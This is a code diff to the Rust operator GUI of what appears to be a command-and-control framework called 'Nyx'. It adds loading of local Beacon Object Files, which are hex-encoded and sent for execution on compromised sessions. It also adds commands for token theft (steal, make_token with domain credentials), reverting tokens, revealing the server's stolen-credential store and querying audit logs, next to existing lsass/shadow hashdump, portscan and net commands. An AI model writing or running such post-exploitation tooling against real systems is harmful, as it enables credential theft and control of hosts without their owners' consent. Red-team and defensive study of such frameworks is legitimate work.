@@ -1227,6 +1227,22 @@ script_mod! {
                                                 draw_text.text_style: theme.font_code{font_size: 12}
                                                 draw_cursor.color: Caccent
                                             }
+                                            bof_file_input := TextInput{
+                                                width: Fill height: 26
+                                                label_align: Align{y: 0.5}
+                                                padding: Inset{left: 8.0, right: 8.0, top: 4.0, bottom: 4.0}
+                                                text: ""
+                                                empty_text: "Local .o/.obj COFF path (hex-encoded on send)"
+                                                draw_bg.color: Cinput
+                                                draw_bg.border_color: Cinput_b
+                                                draw_bg.border_color_focus: Caccent
+                                                draw_bg.border_size: 1.0
+                                                draw_bg.border_radius: 4.0
+                                                draw_text.color: Cprimary
+                                                draw_text.color_empty: Cmuted
+                                                draw_text.text_style: theme.font_code{font_size: 12}
+                                                draw_cursor.color: Caccent
+                                            }
                                             bof_args_input := TextInput{
                                                 width: Fill height: 26
                                                 label_align: Align{y: 0.5}
@@ -1883,10 +1899,13 @@ impl MatchEvent for App {
         if std::env::var("NYX_AUTO_CONNECT").is_ok() {
             self.ensure_bridge();
             if let Some(b) = &self.bridge {
-                let _ = b.from_ui.send(Cmd::Connect {
-                    server: "http://127.0.0.1:8443".to_string(),
-                    password: None,
-                });
+                // Allow operator-less local dev, but honour NYX_SERVER + NYX_TOKEN
+                // when set so the GUI can auto-connect to a secured team server
+                // without typing into the (gated) connect dialog every launch.
+                let server = std::env::var("NYX_SERVER")
+                    .unwrap_or_else(|_| "http://127.0.0.1:8443".to_string());
+                let password = std::env::var("NYX_TOKEN").ok().filter(|s| !s.is_empty());
+                let _ = b.from_ui.send(Cmd::Connect { server, password });
             }
         }
     }
@@ -1969,7 +1988,19 @@ impl MatchEvent for App {
                 self.ensure_bridge();
                 if let Some(b) = &self.bridge {
                     let (url, password) = if bar_connect {
-                        (self.ui.text_input(cx, ids!(server_input)).text(), None)
+                        // Quick-reconnect bar: no password field on the bar itself,
+                        // so fall back to NYX_TOKEN (or the connect-dialog's
+                        // pass_input if it carries a value) so reconnecting to a
+                        // token-gated server doesn't silently 401.
+                        let bar_pw = {
+                            let dlg_pw = self.ui.text_input(cx, ids!(pass_input)).text();
+                            if !dlg_pw.trim().is_empty() {
+                                Some(dlg_pw)
+                            } else {
+                                std::env::var("NYX_TOKEN").ok().filter(|s| !s.is_empty())
+                            }
+                        };
+                        (self.ui.text_input(cx, ids!(server_input)).text(), bar_pw)
                     } else {
                         let raw = self.ui.text_input(cx, ids!(url_input)).text();
                         let pw = self.ui.text_input(cx, ids!(pass_input)).text();
@@ -2050,6 +2081,44 @@ impl MatchEvent for App {
                                     let method = match method_str { "lsass" => 0, "shadow" => 1, _ => 0 };
                                     Cmd::Hashdump { session: sid.clone(), method }
                                 }
+                                Some("getuid") => Cmd::GetUid { session: sid.clone() },
+                                Some("steal") => Cmd::StealToken {
+                                    session: sid.clone(),
+                                    pid: parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0),
+                                },
+                                Some("rev2self") => Cmd::Rev2Self { session: sid.clone() },
+                                Some("make_token") => {
+                                    // make_token DOMAIN\user password [1|2|3]
+                                    let du = parts.get(1).copied().unwrap_or("");
+                                    let (domain, user) = match du.split_once('\\') {
+                                        Some((d, u)) => (d.to_string(), u.to_string()),
+                                        None => (String::new(), du.to_string()),
+                                    };
+                                    let password = parts.get(2).copied().unwrap_or("").to_string();
+                                    let logon_type = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(1);
+                                    Cmd::MakeToken { session: sid.clone(), domain, user, password, logon_type }
+                                }
+                                Some("creds") => {
+                                    // creds [reveal] — pull server credential store
+                                    let reveal = parts.iter().any(|p| *p == "reveal");
+                                    Cmd::FetchCreds { reveal }
+                                }
+                                Some("audit") => {
+                                    // audit [operator <n>] [action <a>] [limit <n>]
+                                    let mut operator = None;
+                                    let mut action = None;
+                                    let mut limit = None;
+                                    let mut it = parts[1..].iter();
+                                    while let Some(&k) = it.next() {
+                                        match k {
+                                            "operator" => operator = it.next().map(|s| s.to_string()),
+                                            "action" => action = it.next().map(|s| s.to_string()),
+                                            "limit" => limit = it.next().and_then(|s| s.parse().ok()),
+                                            _ => {}
+                                        }
+                                    }
+                                    Cmd::FetchAudit { operator, action, limit }
+                                }
                                 Some("driveinfo") => Cmd::Driveinfo { session: sid.clone() },
                                 Some("portscan") => Cmd::Portscan { session: sid.clone(), host: parts.get(1).copied().unwrap_or("").to_string(), ports: parts.get(2).copied().unwrap_or("").to_string() },
                                 Some("net") => Cmd::Net { session: sid.clone(), query: parts.get(1).copied().unwrap_or("").to_string() },
@@ -2082,14 +2151,46 @@ impl MatchEvent for App {
                 if let Some(sid) = session_id {
                     let name = self.ui.text_input(cx, ids!(bof_name_input)).text();
                     let args = self.ui.text_input(cx, ids!(bof_args_input)).text();
+                    let file_path = self.ui.text_input(cx, ids!(bof_file_input)).text();
                     if !name.trim().is_empty() {
+                        // Read the local COFF (.o/.obj) and hex-encode it so the
+                        // server's `data_hex` field carries real bytes. An empty
+                        // path is allowed (BOF may rely on a pre-staged name),
+                        // but we warn so the operator notices the missing payload.
+                        let data_hex = if file_path.trim().is_empty() {
+                            LOG_LINES.write().unwrap().push(
+                                "! BOF file path empty — sending empty COFF (set a local .o path)".to_string(),
+                            );
+                            String::new()
+                        } else {
+                            match std::fs::read(file_path.trim()) {
+                                Ok(bytes) => {
+                                    LOG_LINES.write().unwrap().push(format!(
+                                        "BOF: loaded {} ({} bytes) from {}",
+                                        name.trim(),
+                                        bytes.len(),
+                                        file_path.trim()
+                                    ));
+                                    hex::encode(&bytes)
+                                }
+                                Err(e) => {
+                                    LOG_LINES.write().unwrap().push(format!(
+                                        "! BOF load failed ({}): {e}",
+                                        file_path.trim()
+                                    ));
+                                    // Don't enqueue a broken BOF; bail out.
+                                    self.ui.redraw(cx);
+                                    return;
+                                }
+                            }
+                        };
                         self.ensure_bridge();
                         if let Some(b) = &self.bridge {
                             let _ = b.from_ui.send(Cmd::Bof {
                                 session: sid,
                                 name: name.trim().to_string(),
                                 args: args.trim().to_string(),
-                                data_hex: String::new(),
+                                data_hex,
                             });
                         }
                     } else {
